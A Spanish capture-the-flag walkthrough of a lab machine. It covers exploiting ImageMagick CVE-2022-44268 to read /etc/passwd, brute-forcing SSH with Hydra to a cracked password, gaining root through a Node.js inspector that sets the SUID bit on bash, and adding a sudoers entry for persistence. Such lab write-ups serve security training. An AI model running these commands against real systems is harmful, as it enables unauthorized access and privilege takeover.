# Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2 -oN nmap
```
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-19 07:45 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:35:91:cf:5e:a7:19:b1:af:c9:f3:9e:0e:25:62:2e (RSA)
|   256 7e:c3:e4:b0:20:09:8f:4b:24:f7:cf:72:47:09:ab:b6 (ECDSA)
|_  256 89:89:11:91:38:6d:4f:1f:4f:ec:6c:eb:74:a1:ea:c3 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Redimensionar Imagen/PDF
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
| tls-alpn: 
|_  http/1.1
|_http-title: Redimensionar Imagen/PDF
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=*.vm/organizationName=Docker Boilerplate
| Not valid before: 2015-05-04T17:14:40
|_Not valid after:  2025-05-01T17:14:40
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
chequeo el servicio web (ya sea el puerto 80/http o 443/https)

![image](https://github.com/user-attachments/assets/1509d71f-f704-4776-bc5c-9f71f9ac8cdc)

y por lo visto se pueden cargar imagenes y archivos pdf que al parecer lo que hace el servicio web es redimencionalos, pruebo su funcionamiento

![image](https://github.com/user-attachments/assets/e15f7635-0c48-4dfb-ade9-233f489584ec)

inspecciono a ver si observo algo por detras pero no veo nada a simple vista

![image](https://github.com/user-attachments/assets/8c78d1b7-1e5d-4c3e-ad46-ebbfb5ec2663)

asi que capturo una peticion y compruebo si puedo bypassear la extension y cargar codigo malicioso

![image](https://github.com/user-attachments/assets/a0d3fa00-f010-4a6d-81ca-f4027499be8e)

pero obtengo este error que al buscarlo por internet

![image](https://github.com/user-attachments/assets/c131b3a2-38f0-451c-8ce7-3f160e30263c)

me hace referencia a `imagemagick` que es un software de codigo abierto que permite manipular images, por lo que puedo deducir que lo que corre por detras es
`imagemagick`, por ahora continuare realizando fuzzing web a ver que consigo

# Fuzzing Web

```ruby
feroxbuster -u 'http://172.17.0.2' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png,git -t 40 --random-agent --no-state -d 5
```
```bash
                                                                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.17.0.2
 🚀  Threads               │ 40
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png, git]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 5
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       91l      201w     2737c http://172.17.0.2/
200      GET       91l      201w     2737c http://172.17.0.2/index.php
200      GET     1541l     7290w   118083c http://172.17.0.2/info.php
[>-------------------] - 5s     24403/2283985 8m      found:3       errors:4      
[>-------------------] - 5s     24090/2283919 4993/s  http://172.17.0.2/ 
```
me consigo con un `info.php` que al buscar informacion acerca de `imagemagick` obtengo lo siguiente

![image](https://github.com/user-attachments/assets/8f3e1fbe-7562-4b21-8848-f1d9cb56130e)

puedo ver versiones, asi que comienzo buscando exploit's

![image](https://github.com/user-attachments/assets/19abe31e-acfd-4cf2-8712-efecfe3a846a)

el segundo resultado me interesa ya que al parecer permite la lectura arbitraria de archivos

![image](https://github.com/user-attachments/assets/56fa2a8c-510d-41ee-9b88-448a09418445)

me lleva a una `POC` en github aqui: `https://github.com/voidz0r/CVE-2022-44268`

# Explotando CVE-2022-44268

clonamos el repositorio
```ruby
https://github.com/voidz0r/CVE-2022-44268.git
```

entramos al repositorio clonado
```ruby
cd CVE-2022-44268
```

instalamos `cargo`
```ruby
apt install cargo -y
```

continuamos con los pasos de la `POC`

```ruby
cargo run "/etc/passwd"
```
ahora nos indica que debemos pasar la imagen `image.png` por `ImageMagick` por lo que debemos cargar la imagen por la web

![image](https://github.com/user-attachments/assets/d4b9c306-ec24-4232-8a88-6b608f43354e)

y luego debemos analizar la imagen redimensionada, para lo cual nos descargamos la imagen y procedemos a analizarla

![image](https://github.com/user-attachments/assets/dfb4dfc8-66de-41d0-9b57-47bed49338ea)


```ruby
identify -verbose Untitled.png
```
```bash
Image:
  Filename: Untitled.png
  Permissions: rw-rw-r--
  Format: PNG (Portable Network Graphics)
  Mime type: image/png
  Class: PseudoClass
  Geometry: 500x500+0+0
  Units: Undefined
  Colorspace: sRGB
  Type: Palette
  Base type: Undefined
  Endianness: Undefined
  Depth: 1-bit
  Channel depth:
    red: 1-bit
    green: 1-bit
    blue: 1-bit
  Channel statistics:
    Pixels: 250000
    Red:
      min: 1  (1)
      max: 1 (1)
      mean: 1 (1)
      standard deviation: 0 (0)
      kurtosis: -3
      skewness: 0
      entropy: 0
    Green:
      min: 0  (0)
      max: 0 (0)
      mean: 0 (0)
      standard deviation: 0 (0)
      kurtosis: -3
      skewness: 0
      entropy: 0
    Blue:
      min: 0  (0)
      max: 0 (0)
      mean: 0 (0)
      standard deviation: 0 (0)
      kurtosis: -3
      skewness: 0
      entropy: 0
  Image statistics:
    Overall:
      min: 0  (0)
      max: 1 (1)
      mean: 0.333333 (0.333333)
      standard deviation: 0 (0)
      kurtosis: -1.5
      skewness: 0.707105
      entropy: 0
  Colors: 1
  Histogram:
        250000: (255,0,0) #FF0000 red
  Colormap entries: 2
  Colormap:
    0: (255,0,0) #FF0000 red
    1: (255,255,255) #FFFFFF white
  Rendering intent: Perceptual
  Gamma: 0.454545
  Chromaticity:
    red primary: (0.64,0.33,0.03)
    green primary: (0.3,0.6,0.1)
    blue primary: (0.15,0.06,0.79)
    white point: (0.3127,0.329,0.3583)
  Background color: srgb(99.6124%,99.6124%,99.6124%)
  Border color: srgb(223,223,223)
  Matte color: grey74
  Transparent color: black
  Interlace: None
  Intensity: Undefined
  Compose: Over
  Page geometry: 500x500+0+0
  Dispose: Undefined
  Iterations: 0
  Compression: Zip
  Orientation: Undefined
  Properties:
    date:create: 2024-11-19T12:19:30+00:00
    date:modify: 2024-11-19T12:19:30+00:00
    date:timestamp: 2024-11-19T12:42:44+00:00
    png:bKGD: chunk was found (see Background color, above)
    png:cHRM: chunk was found (see Chromaticity, above)
    png:IHDR.bit-depth-orig: 1
    png:IHDR.bit_depth: 1
    png:IHDR.color-type-orig: 3
    png:IHDR.color_type: 3 (Indexed)
    png:IHDR.interlace_method: 0 (Not interlaced)
    png:IHDR.width,height: 500, 500
    png:PLTE.number_colors: 2
    png:text: 3 tEXt/zTXt/iTXt chunks were found
    png:tIME: 2024-11-19T12:16:46Z
    Raw profile type: 

    1297
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
696e0a6972633a783a33393a33393a697263643a2f7661722f72756e2f697263643a2f75
73722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e61747320
4275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69
622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36
353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f
7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e65
78697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a6170706c69636174696f
6e3a783a313030303a313030303a3a2f686f6d652f6170706c69636174696f6e3a2f6269
6e2f626173680a73797374656d642d6e6574776f726b3a783a3130313a3130343a737973
74656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374
656d642f6e657469663a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d
7265736f6c76653a783a3130323a3130353a73797374656d64205265736f6c7665722c2c
2c3a2f72756e2f73797374656d642f7265736f6c76653a2f7573722f7362696e2f6e6f6c
6f67696e0a6d6573736167656275733a783a3130333a3130363a3a2f6e6f6e6578697374
656e743a2f7573722f7362696e2f6e6f6c6f67696e0a737368643a783a3130343a363535
33343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a6c656e61
6d3a783a313030313a313030313a3a2f686f6d652f6c656e616d3a2f62696e2f62617368
0a

    signature: 153b1b92fd4dc14db5bcbd91a169f6f6e8c715e8fa92add3641ae3dc84f13ee1
  Artifacts:
    filename: Untitled.png
    verbose: true
  Tainted: False
  Filesize: 995B
  Number pixels: 250000
  Pixels per second: 71.621MB
  User time: 0.000u
  Elapsed time: 0:01.003
  Version: ImageMagick 6.9.13-12 Q16 x86_64 18420 https://legacy.imagemagick.org
```

copiamos lo que se marca a continuacion

![image](https://github.com/user-attachments/assets/56995122-2291-4150-98ba-85150ccd2c8e)

lo guardamos en un archivo .txt

![image](https://github.com/user-attachments/assets/14d64f74-f232-4490-8bac-69ae221287c1)

y como esta en hexadecimal, lo pasamos a `ascii` con `xxd`

```ruby
xxd -ps -r cadena.txt
```
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
application:x:1000:1000::/home/application:/bin/bash
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
lenam:x:1001:1001::/home/lenam:/bin/bash
```
y asi hemos podido explotar el `CVE-2022-44268`

# Ataque de diccionario SSH

ya que conocemos los usuarios del sistema y tras intentar leer la llave `/home/lenam/.ssh/id_rsa` no lo consegui, ahora aplicare un ataque de diccionario con el servicio `SSH`

```ruby
hydra -l lenam -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
```bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-19 09:58:14
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344403 login tries (l:1/p:14344403), ~896526 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[STATUS] 337.00 tries/min, 337 tries in 00:01h, 14344070 to do in 709:25h, 12 active
[22][ssh] host: 172.17.0.2   login: lenam   password: loverboy
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 6 final worker threads did not complete until end.
[ERROR] 6 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-19 10:00:14
```

# Escalada de Privilegios

### Lenam

![image](https://github.com/user-attachments/assets/0339ff62-fab0-43d5-9809-f701d583a635)

podemos ejecutar el binario `/bin/kill` como root, buscando en `GTFOBINS` no aparece el binario `KILL` asi que lo busco en la biblia del `hacking` >>> `hacktricks`

![image](https://github.com/user-attachments/assets/90a3b8de-46c0-44a3-95bc-af7cb1e9e48f)

Privesc with kill

![image](https://github.com/user-attachments/assets/e656845f-b3ee-480e-9514-bf3590491207)

por lo visto se podria escalar privilegios si existe un proceso de `node js` ejecutandose como `root` o de otro usuario, por lo que chequeamos si esto sucede en nuestro contexto

![image](https://github.com/user-attachments/assets/3a293aff-f659-4da5-a17d-e231a7b8002a)

tenemos un proceso ejecutandose como `root` de `Node js` asi que continuamos con la escalada siguiendo los pasos en `hacktricks`


![image](https://github.com/user-attachments/assets/8ad010d2-ba53-4424-8886-48c0357e84f7)

enviamos la señal SIGUSR1 al proceso con `PID 53` 

```ruby
sudo /bin/kill -s SIGUSR1 53
```

ahora nos conectamos al `inspector/depurador`

![image](https://github.com/user-attachments/assets/8bda53a9-ad6c-451c-9cbc-1e972a372923)

conexion

```ruby
node inspect 127.0.0.1:9229
```
```bash
exec("process.mainModule.require('child_process').exec('chmod u+s /bin/bash')")
```

enviamos el comando pero no podemos ver si se ejecuta o no asi que salimos del depurador y validos el binario `/bin/bash`

![image](https://github.com/user-attachments/assets/e3bf0916-b5ff-47fd-8cba-3f6f6c5606fb)

se a ejecutado correctamente la asignacion del BIT SUID 

para escalar finalmente a root ejecutamos `bash -p`, luego hago que el user `lenam` pueda ejecutar cualquier comando como `root`

```ruby
echo 'lenam ALL=(ALL) ALL' >> /etc/sudoers
```
volvemos al user `lenam` con un `exit` y escalamos nuevamente a `root` con un >>> `sudo su`

![image](https://github.com/user-attachments/assets/f3c6aa6f-5dc7-4031-8056-3e2cc8bac738)

`ROOT`















